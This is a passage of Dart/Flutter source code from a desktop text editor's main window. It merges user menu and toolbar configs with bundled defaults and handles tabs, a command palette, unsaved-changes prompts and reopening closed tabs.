  /// with the packaged defaults so a new version's menu items actually reach
  /// users who already have a settings/menus/main_menu.json (it is seeded once
  /// and never overwritten). See menu_merge.dart for the merge rules; the
  /// snapshot the merge needs lives beside it as main_menu.base.json.
  /// The external config as a JSON object, or the bundled one when the
  /// external file is not one (a root array, a stray edit): the menu bar
  /// used to vanish entirely — `as Map` threw, _menus stayed empty and
  /// nothing said why.
  Future<Map<String, Object?>> _loadConfigMap(String rel, String asset) async {
    try {
      final raw = await loadConfigString(rel);
      return (jsonDecode(raw) as Map).cast<String, Object?>();
    } catch (e) {
      Log.instance.w('$rel: unusable, using the bundled default ($e)');
      return (jsonDecode(await rootBundle.loadString(asset)) as Map)
          .cast<String, Object?>();
    }
  }

  Future<void> _loadMenus() async {
    final map = await _loadConfigMap(
      'menus/main_menu.json',
      'assets/menus/main_menu.json',
    );
    _deletedMenus = MenuNode.parseDeleted(map);
    final menus = await _mergeWithDefaults(
      rel: 'menus/main_menu.json',
      asset: 'assets/menus/main_menu.json',
      key: 'menus',
      user: MenuNode.parseConfig(map),
      // The menu editor records removals, so a default the user threw away is
      // known and never resurrected — which makes an additive first merge safe.
      deleted: _deletedMenus,
      mergeWithoutBase: true,
      extraJson: () => _deletedMenus.isEmpty
          ? const {}
          : {'deleted': [for (final m in _deletedMenus) m.toJson()]},
    );
    if (mounted) setState(() => _menus = menus);
  }


  // Load the toolbar definition (settings/toolbar.json, falling back to the
  // bundled default) and merge it with the newer default.
  Future<void> _loadToolbar() async {
    final map = await _loadConfigMap('toolbar.json', 'assets/toolbar.json');
    final items = await _mergeWithDefaults(
      rel: 'toolbar.json',
      asset: 'assets/toolbar.json',
      key: 'items',
      user: MenuNode.parseNodes(map['items']),
      // No deleted area here: removing a toolbar button just drops it back into
      // the editor's "unused" pool, leaving no record. Without a base snapshot
      // an absent default is indistinguishable from one the user removed, so
      // the first run only records the snapshot — merging then would put every
      // button they took off right back.
      mergeWithoutBase: false,
    );
    if (mounted) setState(() => _toolbarItems = items);
  }

  /// Reconcile a user-owned config tree with the packaged defaults.
  ///
  /// [rel] is the settings-relative path, [asset] its bundled counterpart and
  /// [key] the JSON list key. [mergeWithoutBase] decides what happens the first
  /// time (no `<name>.base.json` yet): true = additive merge, false = record the
  /// snapshot and change nothing. A merge that changes anything is written back,
  /// keeping a one-shot `<name>.premerge.json` of what it replaced.
  Future<List<MenuNode>> _mergeWithDefaults({
    required String rel,
    required String asset,
    required String key,
    required List<MenuNode> user,
    required bool mergeWithoutBase,
    List<MenuNode> deleted = const [],
    Map<String, Object?> Function()? extraJson,
  }) async {
    var nodes = dedupeMenus(user);
    final defaults = dedupeMenus(
      MenuNode.parseNodes(
        ((jsonDecode(await rootBundle.loadString(asset)) as Map)
            .cast<String, Object?>())[key],
      ),
    );
    final baseFile = File(settingsPath(_baseName(rel)));
    List<MenuNode>? base;
    String? baseRaw;
    try {
      if (await baseFile.exists()) {
        baseRaw = await baseFile.readAsString();
        base = MenuNode.parseNodes(
          ((jsonDecode(baseRaw) as Map).cast<String, Object?>())[key],
        );
      }
    } catch (e) {
      Log.instance.w('$rel: base snapshot unreadable ($e)');
    }

    if (base != null || mergeWithoutBase) {
      final merged = mergeMenus(
        user: nodes,
        def: defaults,
        base: base,
        deleted: deleted,
      );
      if (merged.changed) {
        Log.instance.i('$rel merged with new defaults: $merged');
        nodes = merged.menus;
        _mergeAdded[rel] = merged.added.length;
        await _saveMerged(rel, key, nodes, extraJson?.call() ?? const {});
      }
    }
    // Record what we reconciled against, so the next version's merge can tell
    // the user's edits from the defaults' changes.
    // Rewritten whenever the defaults changed in ANY way, not only when the
    // id set did: a label/shortcut/icon-only change left the snapshot at the
    // old version, so a node that had been updated once never compared
    // equal to "base" again and was frozen for every later version.
    final defJson = jsonEncode({
      key: [for (final n in defaults) n.toJson()],
    });
    if (baseRaw != defJson) {
      try {
        await baseFile.parent.create(recursive: true);
        await baseFile.writeAsString(defJson);
      } catch (e) {
        Log.instance.w('$rel: base snapshot write failed ($e)');
      }
    }
    return nodes;
  }

  /// How many items each config gained in this launch's merge, for the notice
  /// below. Only additions are announced: a default that was dropped or whose
  /// label changed is not something the user needs to act on (it is in the log
  /// either way).
  final Map<String, int> _mergeAdded = {};

  /// Tell the user their menu / toolbar picked up this version's new items —
  /// the merge rewrites a file they own, so it should not be silent.
  void _announceMerges() {
    if (!mounted || (_mergeAdded.isEmpty && scriptsWithNewVersion.isEmpty)) {
      return;
    }
    final l10n = AppLocalizations.of(context);
    final lines = <String>[
      for (final e in _mergeAdded.entries)
        if (e.value > 0)
          l10n.trf(
            e.key == 'toolbar.json' ? 'merge_toolbar_updated' : 'merge_menu_updated',
            ['${e.value}'],
          ),
      // Built-in scripts the user had edited: the new text is parked as .new
      // and Tools → Script Updates keeps the affordance around; this line is only to
      // make them aware it is there.
      if (scriptsWithNewVersion.isNotEmpty)
        l10n.trf('scripts_updates_toast', [
          '${scriptsWithNewVersion.length}',
        ]),
    ];
    _mergeAdded.clear();
    if (lines.isEmpty) return;
    Log.instance.d('merge notice: ${lines.join(' | ')}');
    ScaffoldMessenger.of(context)
      ..removeCurrentSnackBar()
      ..showSnackBar(
        SnackBar(
          content: Text(lines.join('\n')),
          duration: const Duration(seconds: 6),
        ),
      );
  }

  static String _baseName(String rel) =>
      rel.replaceFirst(RegExp(r'\.json$'), '.base.json');

  /// Write a merged tree back, keeping a one-shot backup of what it replaced —
  /// the merge rewrites a file the user owns, so leave them a way back.
  Future<void> _saveMerged(
    String rel,
    String key,
    List<MenuNode> nodes,
    Map<String, Object?> extra,
  ) async {
    try {
      final f = File(settingsPath(rel));
      if (await f.exists()) {
        final bak = File(settingsPath(_baseName(rel).replaceFirst('.base.', '.premerge.')));
        if (!await bak.exists()) await f.copy(bak.path);
      }
      await f.parent.create(recursive: true);
      await f.writeAsString(
        jsonEncode({
          key: [for (final n in nodes) n.toJson()],
          ...extra,
        }),
      );
    } catch (e) {
      Log.instance.w('$rel: merge save failed ($e)');
    }
  }

  // Toolbar editor: same live-preview draft dance as the menu editor.
  Future<void> _openToolbarEditor() async {
    final original = _toolbarItems;
    final draft = [for (final m in _toolbarItems) m.deepCopy()];
    setState(() => _toolbarItems = draft);
    final saved = await showToolbarEditorDialog(
      context,
      draft: draft,
      // Every main-menu action item can be added to the toolbar.
      menuSource: _menus,
      onChanged: () {
        if (mounted) setState(() {});
      },
    );
    if (!mounted) return;
    if (!saved) setState(() => _toolbarItems = original);
  }

  // The toolbar row under the menubar: icon buttons + separators. Items
  // without a (known) icon render as compact text buttons with their label —
  // clearer than a meaningless placeholder glyph. Items without an action
  // are skipped.
  List<Widget> _toolbarButtons() {
    final l10n = AppLocalizations.of(context);
    return [
      for (final n in _toolbarItems)
        if (n.isSeparator)
          Container(
            width: 1,
            height: 20,
            margin: const EdgeInsets.symmetric(horizontal: 4),
            color: _barFg.withValues(alpha: 0.3),
          )
        else if (n.action != null && MenuNode.menuIcons[n.icon] != null)
          // A checkable action (word wrap, a view mode, macro recording…)
          // shows its state: a tinted backdrop while it is on.
          IconButton(
            icon: Icon(MenuNode.menuIcons[n.icon], size: 18),
            tooltip: _toolbarLabel(l10n, n),
            color: _barFg,
            padding: EdgeInsets.zero,
            constraints: const BoxConstraints(minWidth: 32, minHeight: 32),
            style: _menuChecked(n.action!) == true
                ? IconButton.styleFrom(
                    backgroundColor: _barFg.withValues(alpha: 0.18),
                  )
                : null,
            onPressed: () => _onMenuAction(n.action!),
          )
        else if (n.action != null)
          TextButton(
            style: TextButton.styleFrom(
              foregroundColor: _barFg,
              padding: const EdgeInsets.symmetric(horizontal: 8),
              minimumSize: const Size(0, 32),
              tapTargetSize: MaterialTapTargetSize.shrinkWrap,
            ),
            onPressed: () => _onMenuAction(n.action!),
            child: Text(
              _toolbarLabel(l10n, n),
              style: const TextStyle(fontSize: 12),
            ),
          ),
    ];
  }

  // Toolbar label: an item that lives in a nested submenu is ambiguous on
  // its own on the toolbar ("No wrap" of what?) — prefix its submenu's label,
  // e.g. "Word wrap: No wrap". Items directly under a top-level menu keep their
  // bare label.
  String _toolbarLabel(AppLocalizations l10n, MenuNode n) {
    final own = l10n.tr(n.labelKey ?? n.action!);
    final parentKey = _nestedSubmenuKeyOf(n.action, _menus, 0);
    return parentKey == null ? own : '${l10n.tr(parentKey)}:$own';
  }

  // The labelKey of the nested (non-top-level) submenu that contains
  // [action]; null when the action sits directly under a top-level menu or
  // is not in the menu tree at all.
  String? _nestedSubmenuKeyOf(String? action, List<MenuNode> nodes, int depth) {
    if (action == null) return null;
    for (final n in nodes) {
      final kids = n.children;
      if (kids == null) continue;
      if (depth >= 1 && kids.any((c) => c.action == action)) return n.labelKey;
      final r = _nestedSubmenuKeyOf(action, kids, depth + 1);
      if (r != null) return r;
    }
    return null;
  }

  // Switch the active pane: swap the controller the AppBar listens to.
  void _setActive(int id) {
    if (_activeId == id) return;
    _active?.removeListener(_onEditorChanged);
    _activeId = id;
    _controllers[id]?.addListener(_onEditorChanged);
    // Switching to a tab is a natural moment to notice its file changed on
    // disk (fire-and-forget; no-op while the pane is still loading).
    _controllers[id]?.checkExternalChange();
    if (mounted) setState(() {});
  }

  // Jump to (select) an existing pane: if it sits in a tab group switch to that
  // tab, then make it active and give it focus.
  void _selectItem(int id) {
    // Debug-level: the order of pane selections at startup is the only way to
    // see a "the file opened but an older tab kept the focus" race.
    Log.instance.d('select pane $id (${_paths[id] ?? '(untitled)'})');
    final item = _layout.findDockingItem(id);
    if (item != null && item.parent is DockingTabs) {
      final tabs = item.parent as DockingTabs;
      for (var i = 0; i < tabs.childrenCount; i++) {
        if (identical(tabs.childAt(i), item)) {
          tabs.selectedIndex = i;
          _layout.rebuild(); // notify → Docking repaints and switches to that tab
          break;
        }
      }
    }
    _setActive(id);
    // Take focus only after switching to the tab (visible next frame);
    // an offstage pane cannot take focus.
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _controllers[id]?.focusEditor();
    });
  }

  // Path canonicalization (duplicate-open comparison; case-insensitive on Windows).
  String _canonical(String path) {
    final c = File(path).absolute.path;
    return Platform.isWindows ? c.toLowerCase() : c;
  }

  // Active editor state changed (open/save/index/keymap/modified) → rebuild the AppBar.
  void _onEditorChanged() {
    _syncActivePaneIdentity();
    if (mounted) setState(() {});
  }

  // Save As gives a pane a (new) file identity: the duplicate-open map was
  // filled when the pane was built and goes stale the moment the controller's
  // path changes — resync it and repaint the tab strip (the title itself is
  // rendered live by [_tabTitle]). Only the active pane can save, so watching
  // the active controller is enough.
  void _syncActivePaneIdentity() {
    final id = _activeId;
    final c = id == null ? null : _controllers[id];
    final path = c?.path;
    if (id == null || path == null) return; // untitled: keep the placeholder
    final canon = _canonical(path);
    if (_paths[id] == canon) return;
    _paths[id] = canon;
    _touchRecent(path); // Save As = a fresh file identity worth remembering
    _layout.rebuild(); // repaint the tab strip with the new title
  }

  // Tab title, rendered through the leading builder because TabData offers
  // no tooltip or secondary-tap hook: hover shows the full path, right-click
  // opens the copy/reveal menu. [fallbackPath] is the path the pane was
  // built with — session restore builds non-active panes whose controller
  // has not loaded yet (and the shell only listens to the active one).
  Widget _tabTitle(BuildContext context, int id, String? fallbackPath) {
    final c = _controllers[id];
    final path = c?.path ?? fallbackPath;
    final l10n = AppLocalizations.of(context);
    var name = path == null
        ? l10n.tr('common_untitled')
        : path.split(Platform.pathSeparator).last;
    // Unsaved-changes and saving markers (the AppBar no longer shows a file
    // name, so the tab is the one place for them).
    if (c?.modified ?? false) name = '$name ●';
    if (c?.saving ?? false) name = name + l10n.tr('app_saving_suffix');
    if (c?.tail ?? false) {
      name = '$name ⇣'; // tailing (implies read-only)
    } else if (c?.readOnly ?? false) {
      name = '$name 🔒';
    }
    return GestureDetector(
      behavior: HitTestBehavior.opaque,
      onSecondaryTapUp: (d) => _showTabContextMenu(id, path, d.globalPosition),
      child: Tooltip(
        message: path ?? name,
        waitDuration: const Duration(milliseconds: 600),
        child: Text(
          name,
          style: TabbedViewTheme.of(context).tab.textStyle,
          overflow: TextOverflow.ellipsis,
        ),
      ),
    );
  }

  Future<void> _showTabContextMenu(int id, String? path, Offset pos) async {
    final l10n = AppLocalizations.of(context);
    final name = path == null
        ? l10n.tr('common_untitled')
        : path.split(Platform.pathSeparator).last;
    // Pane ids in layout order, for the close-others / close-right items.
    final ids = [for (final it in _allItems()) it.id as int];
    final at = ids.indexOf(id);
    final all = ids;
    final others = [
      for (final i in ids)
        if (i != id) i,
    ];
    final right = at < 0 ? <int>[] : ids.sublist(at + 1);
    final overlay = Overlay.of(context).context.findRenderObject() as RenderBox;
    final choice = await showMenu<String>(
      context: context,
      position: RelativeRect.fromRect(
        pos & const Size(1, 1),
        Offset.zero & overlay.size,
      ),
      items: [
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'close',
          child: Text(l10n.tr('tab_close')),
        ),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'closeOthers',
          enabled: others.isNotEmpty,
          child: Text(l10n.tr('tab_close_others')),
        ),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'closeRight',
          enabled: right.isNotEmpty,
          child: Text(l10n.tr('tab_close_right')),
        ),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'closeAll',
          enabled: all.isNotEmpty,
          child: Text(l10n.tr('tab_close_all')),
        ),
        const PopupMenuDivider(),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'name',
          child: Text(l10n.tr('tab_copy_name')),
        ),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'path',
          enabled: path != null,
          child: Text(l10n.tr('tab_copy_path')),
        ),
        PopupMenuItem(
          height: AppSettings.instance.menuRowHeight,
          value: 'reveal',
          enabled: path != null,
          child: Text(l10n.tr('tab_reveal')),
        ),
      ],
    );
    switch (choice) {
      case 'close':
        _requestClosePane(id);
      case 'closeOthers':
        await _closePanes(others);
      case 'closeRight':
        await _closePanes(right);
      case 'closeAll':
        await _closePanes(all);
      case 'name':
        await Clipboard.setData(ClipboardData(text: name));
      case 'path':
        await Clipboard.setData(ClipboardData(text: path!));
      case 'reveal':
        _revealInFileManager(path!);
    }
  }

  // Open the platform file manager with [path] selected (best effort — on
  // Linux there is no portable "select" verb, so open the parent directory).
  void _revealInFileManager(String path) {
    try {
      if (Platform.isWindows) {
        Process.start('explorer.exe', [
          '/select,$path',
        ], mode: ProcessStartMode.detached);
      } else if (Platform.isMacOS) {
        Process.start('open', ['-R', path], mode: ProcessStartMode.detached);
      } else {
        Process.start('xdg-open', [
          File(path).parent.path,
        ], mode: ProcessStartMode.detached);
      }
    } catch (e) {
      Log.instance.w('reveal in file manager failed: $path ($e)');
    }
  }

  // Open a file: pick → jump to the existing tab if already open, otherwise
  // create a new pane and add it to the docking layout.
  Future<void> _openNewFile() async {
    final picked = await MacFiles.openFile();
    if (picked == null) return;
    final path = picked.path;
    final canon = _canonical(path);
    _touchRecent(path);
    for (final entry in _paths.entries) {
      if (entry.value == canon) {
        _selectItem(entry.key); // already open → jump to that tab, do not open twice
        return;
      }
    }
    _addEditorPane(path, canon);
  }

  // The active pane, when it is a pristine untitled document (never edited),
  // gets used up by the next file open — like every editor's empty tab.
  int? _pristineUntitledId() {
    final id = _activeId;
    final c = id == null ? null : _controllers[id];
    if (c != null && c.hasDoc && c.path == null && !c.modified) return id;
    return null;
  }

  // Programmatic pane removal (no user close event): drop it from the
  // layout, then clean up the same way _onItemClose does.
  void _removePane(int id) {
    _layout.removeItemByIds([id]);
    _paths.remove(id);
    final c = _controllers.remove(id);
    _releaseSandboxAccess(c);
    c?.removeListener(_onEditorChanged);
    c?.dispose();
    _scheduleSessionSave();
  }

  // Balance the startAccess taken during session restore. Files picked through a panel this run
  // never took one, so this is a no-op for them; the stored bookmark is kept either way.
  void _releaseSandboxAccess(EditorController? c) {
    final path = c?.path;
    if (path != null) MacFiles.stopAccess(path);
  }

  // Returns the new pane's id (callers may queue work on its controller).
  int _addEditorPane(String path, String canon, {SessionFile? restore}) {
    final replaceId = _pristineUntitledId();
    final id = _nextId++;
    final item = _buildPaneItem(
      id,
      SessionFile(
        id: id,
        path: path,
        caret: restore?.caret ?? 0,
        anchor: restore?.anchor ?? 0,
        encoding: restore?.encoding,
        bookmarks: restore?.bookmarks ?? const [],
        wrap: restore?.wrap,
      ),
    );

    if (_layout.root == null) {
      _layout.root = item; // first file
    } else {
      // Later files: add as a new tab to the tab group containing the active
      // pane (via dropIndex; dropPosition is reserved for drag-to-split).
      final activeItem = _activeId == null
          ? null
          : _layout.findDockingItem(_activeId);
      final target = activeItem ?? _firstItem(_layout.root!);
      final parent = target?.parent;
      if (parent is DockingTabs) {
        _layout.addItemOn(
          newItem: item,
          targetArea: parent,
          dropIndex: parent.childrenCount,
        );
      } else if (target != null) {
        _layout.addItemOn(newItem: item, targetArea: target, dropIndex: 1);
      } else {
        _layout.root = item; // should be unreachable (root non-null but item not found)
      }
    }
    // The foreground pane is a "pristine untitled document" → the newly opened
    // file replaces it (add first, then remove, so the position does not jump).
    if (replaceId != null && replaceId != id) _removePane(replaceId);
    _selectItem(id); // switch to the new tab and take focus
    return id;
  }

  // Recursively find the first DockingItem in the layout.
  // ctrl+shift+w / File → Exit: through onWindowClose → unsaved-changes
  // confirm → final session save → destroy.
  void _closeWindow() {
    windowManager.close().catchError((_) {});
  }

  // ctrl+shift+n：spawn a second process with --new-window — it skips the
  // single-instance guard and never touches the session (see main.dart).
  void _openNewWindow() {
    try {
      Process.start(Platform.resolvedExecutable, [
        '--new-window',
      ], mode: ProcessStartMode.detached);
    } catch (e) {
      Log.instance.w('new window failed: $e');
    }
  }

  // ctrl+shift+p：command palette — every action item of the menu tree
  // (localized label + menu path + shortcut tag), filterable; Enter runs the
  // pick through _onMenuAction. Dynamic submenus (syntax/encoding) are
  // runtime-generated and skipped.
  Future<void> _openCommandPalette() async {
    final l10n = AppLocalizations.of(context);
    final entries = <(String, String, String?)>[]; // label / action / shortcut
    void walk(List<MenuNode> ns, String prefix) {
      for (final n in ns) {
        if (n.isSeparator || n.dynamicId != null) continue;
        final own = l10n.tr(n.labelKey ?? n.action ?? '');
        final label = prefix.isEmpty ? own : '$prefix › $own';
        if (n.children != null) {
          walk(n.children!, label);
        } else if (n.action != null) {
          final live = _shortcutFor(n.action!);
          entries.add((
            label,
            n.action!,
            live == null ? n.shortcut : (live.isEmpty ? null : live),
          ));
        }
      }
    }

    walk(_menus, '');
    final scrollCtl = ScrollController();
    const rowH = 32.0, listH = 360.0;
    final action = await showDialog<String>(
      context: context,
      builder: (ctx) {
        var query = '';
        var selected = 0;
        return StatefulBuilder(
          builder: (ctx, setSt) {
            final q = query.toLowerCase();
            final filtered = q.isEmpty
                ? entries
                : [
                    for (final e in entries)
                      if (e.$1.toLowerCase().contains(q) ||
                          e.$2.toLowerCase().contains(q))
                        e,
                  ];
            if (selected >= filtered.length) {
              selected = filtered.isEmpty ? 0 : filtered.length - 1;
            }
            void reveal() {
              if (!scrollCtl.hasClients) return;
              final top = selected * rowH;
              final off = scrollCtl.offset;
              if (top < off) {
                scrollCtl.jumpTo(top);
              } else if (top + rowH > off + listH) {
                scrollCtl.jumpTo(top + rowH - listH);
              }
            }

            final cs = Theme.of(ctx).colorScheme;
            return Dialog(
              alignment: Alignment.topCenter,
              insetPadding: const EdgeInsets.only(top: 80),
              child: SizedBox(
                width: 560,
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Padding(
                      padding: const EdgeInsets.all(8),
                      child: Focus(
                        // Arrows would move the field's caret — intercept
                        // them for list navigation before Shortcuts runs.
                        onKeyEvent: (node, e) {
                          if (e is! KeyDownEvent && e is! KeyRepeatEvent) {
                            return KeyEventResult.ignored;
                          }
                          if (e.logicalKey == LogicalKeyboardKey.arrowDown ||
                              e.logicalKey == LogicalKeyboardKey.arrowUp) {
                            setSt(() {
                              if (filtered.isEmpty) return;
                              final d =
                                  e.logicalKey == LogicalKeyboardKey.arrowDown
                                  ? 1
                                  : -1;
                              selected =
                                  (selected + d + filtered.length) %
                                  filtered.length;
                            });
                            WidgetsBinding.instance.addPostFrameCallback(
                              (_) => reveal(),
                            );
                            return KeyEventResult.handled;
                          }
                          return KeyEventResult.ignored;
                        },
                        child: TextField(
                          autofocus: true,
                          decoration: InputDecoration(
                            isDense: true,
                            prefixIcon: const Icon(Icons.search, size: 18),
                            hintText: l10n.tr('palette_hint'),
                          ),
                          onChanged: (v) => setSt(() {
                            query = v;
                            selected = 0;
                          }),
                          onSubmitted: (_) {
                            if (selected < filtered.length) {
                              Navigator.pop(ctx, filtered[selected].$2);
                            }
                          },
                        ),
                      ),
                    ),
                    ConstrainedBox(
                      constraints: const BoxConstraints(maxHeight: listH),
                      child: ListView.builder(
                        controller: scrollCtl,
                        shrinkWrap: true,
                        itemExtent: rowH,
                        itemCount: filtered.length,
                        itemBuilder: (ctx, i) {
                          final e = filtered[i];
                          return InkWell(
                            onTap: () => Navigator.pop(ctx, e.$2),
                            child: Container(
                              color: i == selected
                                  ? cs.primary.withValues(alpha: 0.15)
                                  : null,
                              padding: const EdgeInsets.symmetric(
                                horizontal: 12,
                              ),
                              alignment: Alignment.centerLeft,
                              child: Row(
                                children: [
                                  Expanded(
                                    child: Text(
                                      e.$1,
                                      overflow: TextOverflow.ellipsis,
                                    ),
                                  ),
                                  if (e.$3 != null)
                                    Text(
                                      e.$3!,
                                      style: TextStyle(
                                        color: cs.outline,
                                        fontSize: 12,
                                      ),
                                    ),
                                ],
                              ),
                            ),
                          );
                        },
                      ),
                    ),
                    const SizedBox(height: 8),
                  ],
                ),
              ),
            );
          },
        );
      },
    );
    disposeLater(scrollCtl);
    if (!mounted || action == null) return;
    _onMenuAction(action);
  }

  // All panes in layout-tree order (across groups when the window is split).
  List<DockingItem> _allItems() {
    final items = <DockingItem>[];
    void walk(DockingArea area) {
      if (area is DockingItem) items.add(area);
      if (area is DockingParentArea) {
        for (var i = 0; i < area.childrenCount; i++) {
          walk(area.childAt(i));
        }
      }
    }

    final root = _layout.root;
    if (root != null) walk(root);
    return items;
  }

  // ctrl+tab / ctrl+shift+tab: cycle through panes in layout order.
  void _cycleTab(int dir) {
    final items = _allItems();
    if (items.length < 2) return;
    final idx = items.indexWhere((it) => it.id == _activeId);
    final next = items[(idx < 0 ? 0 : idx + dir + items.length) % items.length];
    _selectItem(next.id as int);
  }

  // alt+1..9: jump to the n-th tab (no-op when out of range).
  void _gotoTabN(int n) {
    final items = _allItems();
    if (n < 1 || n > items.length) return;
    _selectItem(items[n - 1].id as int);
  }

  DockingItem? _firstItem(DockingArea area) {
    if (area is DockingItem) return area;
    if (area is DockingParentArea) {
      for (var i = 0; i < area.childrenCount; i++) {
        final found = _firstItem(area.childAt(i));
        if (found != null) return found;
      }
    }
    return null;
  }

  // ── close confirmation for unsaved changes ────────────────

  bool _unsavedDialogOpen = false; // one prompt at a time

  // Three-way choice: 'save' / 'discard' / anything else (cancel, dialog dismissed).
  Future<String?> _askUnsaved(String message) {
    final l10n = AppLocalizations.of(context);
    return showDialog<String>(
      context: context,
      builder: (ctx) => AlertDialog(
        title: Text(l10n.tr('unsaved_title')),
        content: Text(message),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(ctx, 'cancel'),
            child: Text(l10n.tr('common_cancel')),
          ),
          TextButton(
            onPressed: () => Navigator.pop(ctx, 'discard'),
            child: Text(l10n.tr('btn_dont_save')),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(ctx, 'save'),
            child: Text(l10n.tr('common_save')),
          ),
        ],
      ),
    );
  }

  // Save [c] for a close ("save" was chosen): file-backed saves in place,
  // untitled opens Save As. True when it ended up clean — still modified
  // means the panel was canceled or the save failed, so the close aborts.
  Future<bool> _saveForClose(EditorController c) async {
    if (c.path == null) {
      await c.saveAs();
    } else {
      await c.save();
    }
    return !c.modified;
  }

  // Tab close on a modified pane: the docking interceptor is sync, so block
  // the close, ask, and remove the pane programmatically on yes.
  bool _itemCloseInterceptor(DockingItem item) {
    final c = _controllers[item.id as int];
    if (c == null || !c.modified) return true;
    _confirmThenClose(item, c);
    return false;
  }

  // ctrl+w / menu: close a pane programmatically — clean panes close right
  // away, modified ones go through the same confirm as the tab's ✕.
  void _requestClosePane(int id) {
    final item = _layout.findDockingItem(id);
    if (item == null) return;
    final c = _controllers[id];
    // No controller = a diff/merge tab: nothing to save, close right away
    // (ctrl+w / the tab menu used to silently do nothing on those).
    if (c == null || !c.modified) {
      _layout.removeItemByIds([id]);
      _onItemClose(item);
      return;
    }
    _confirmThenClose(item, c);
  }

  void _confirmThenClose(DockingItem item, EditorController c) {
    if (_unsavedDialogOpen) return;
    () async {
      _unsavedDialogOpen = true;
      try {
        final l10n = AppLocalizations.of(context);
        final name = c.name ?? l10n.tr('common_untitled');
        final choice = await _askUnsaved(l10n.trf('unsaved_msg_one', [name]));
        if (choice == 'save' && !await _saveForClose(c)) return;
        if (choice != 'save' && choice != 'discard') return;
        if (!mounted || !_controllers.containsKey(item.id)) return;
        _layout.removeItemByIds([item.id]);
        _onItemClose(item); // same cleanup as a docking-driven close
      } finally {
        _unsavedDialogOpen = false;
      }
    }();
  }

  // File → Save All: save every modified pane in layout order. An untitled
  // one needs a Save As panel, so it is brought to the front first; a
  // cancelled panel stops the walk (the rest stay modified).
  Future<void> _saveAll() async {
    if (_unsavedDialogOpen) return;
    _unsavedDialogOpen = true;
    try {
      for (final it in _allItems()) {
        final id = it.id as int;
        final c = _controllers[id];
        if (c == null || !c.modified) continue;
        if (c.path == null) _selectItem(id);
        if (!await _saveForClose(c)) return;
        if (!mounted) return;
      }
    } finally {
      _unsavedDialogOpen = false;
    }
  }

  // Close several panes at once (tab context menu: close others / right /
  // all). Modified ones get a single combined prompt like the window close;
  // "save" walks them one by one (showing each), and any cancel leaves
  // everything open. Clean panes close right away.
  Future<void> _closePanes(List<int> ids) async {
    final dirty = [
      for (final id in ids)
        if (_controllers[id]?.modified ?? false) id,
    ];
    if (dirty.isNotEmpty) {
      if (_unsavedDialogOpen) return;
      _unsavedDialogOpen = true;
      try {
        final l10n = AppLocalizations.of(context);
        final msg = dirty.length == 1
            ? l10n.trf('unsaved_msg_one', [
                _controllers[dirty.single]?.name ?? l10n.tr('common_untitled'),
              ])
            : l10n.trf('unsaved_msg_many', [dirty.length]);
        final choice = await _askUnsaved(msg);
        if (choice == 'save') {
          for (final id in dirty) {
            final c = _controllers[id];
            if (c == null) continue;
            _selectItem(id);
            if (!await _saveForClose(c)) return;
          }
        } else if (choice != 'discard') {
          return;
        }
      } finally {
        _unsavedDialogOpen = false;
      }
    }
    if (!mounted) return;
    for (final id in ids) {
      final item = _layout.findDockingItem(id);
      if (item == null) continue; // controller-less diff/merge tabs close too
      _layout.removeItemByIds([id]);
      _onItemClose(item);
    }
  }

  // Window close with modified panes: one prompt covers them all. True =
  // go ahead and close.
  Future<bool> _confirmCloseAll() async {
    final dirty = _controllers.entries.where((e) => e.value.modified).toList();
    if (dirty.isEmpty) return true;
    if (_unsavedDialogOpen) return false;
    _unsavedDialogOpen = true;
    try {
      final l10n = AppLocalizations.of(context);
      final choice = await _askUnsaved(
        l10n.trf('unsaved_msg_many', [dirty.length]),
      );
      if (choice == 'discard') return true;
      if (choice != 'save') return false;
      for (final e in dirty) {
        // Show which file is being asked about (Save As panels especially).
        _selectItem(e.key);
        if (!await _saveForClose(e.value)) return false;
      }
      return true;
    } finally {
      _unsavedDialogOpen = false;
    }
  }

  // ── reopen closed tab (ctrl+shift+t) ──────────────────────

  // Recently closed file-backed panes, newest last. Untitled panes are not
  // recorded — their content is never persisted.
  final List<SessionFile> _closedStack = [];
  static const int _closedStackMax = 10;

  void _recordClosed(EditorController? c) {
    final path = c?.path;
    if (c == null || path == null) return;
    final caret = c.caretOffset, anchor = c.anchorOffset;
    final enc = c.manualEncoding;
    final marks = c.bookmarks;
    final wrapOverride = c.wrapOverride;
    // The bookmark lookup is async (macOS re-grant across close/reopen);
    // push after it resolves — order within the stack still holds.
    () async {
      String? bm;
      try {
        bm = await MacFiles.bookmarkOf(path);
      } catch (_) {}
      _closedStack.add(
        SessionFile(
          id: -1,
          path: path,
          caret: caret,
          anchor: anchor,
          encoding: enc,
          bookmark: bm,
          bookmarks: marks,
          wrap: wrapOverride,
        ),
      );
      if (_closedStack.length > _closedStackMax) _closedStack.removeAt(0);
    }();
  }

  Future<void> _reopenClosedTab() async {
    while (_closedStack.isNotEmpty) {
      final f = _closedStack.removeLast();
      var path = f.path;
      // macOS sandbox: re-grant access first (the file may also have moved).
      final b = f.bookmark;
      if (b != null && b.isNotEmpty) {
        final p = await MacFiles.startAccess(b);
        if (p != null) path = p;
      }
      if (!File(path).existsSync()) continue; // gone → fall back to older
      final canon = _canonical(path);
      _touchRecent(path);
      int? existingId;
      for (final e in _paths.entries) {
        if (e.value == canon) {
          existingId = e.key;
          break;
        }
      }
      if (existingId != null) {
        _selectItem(existingId); // already open → just jump to it
      } else {
        _addEditorPane(path, canon, restore: f);
      }
      return;
    }
  }

  // Close a pane: dispose its controller; if it was the active one, hand
  // active over to the first remaining pane. Closing the last tab → add a
  // blank untitled document (the window always has something to edit).
  void _onItemClose(DockingItem item) {
    final id = item.id as int;
    _diffPanes.remove(id);
    _recordClosed(_controllers[id]); // capture before dispose
    _paths.remove(id);
    final c = _controllers.remove(id);
    _releaseSandboxAccess(c);
    c?.removeListener(_onEditorChanged);
    c?.dispose();
    if (_activeId == id) {
      _activeId = null;
      final first = _layout.root == null ? null : _firstItem(_layout.root!);
      if (first != null) {
        _setActive(first.id as int);
      } else if (mounted) {
        setState(() {});
      }
    } else if (mounted) {
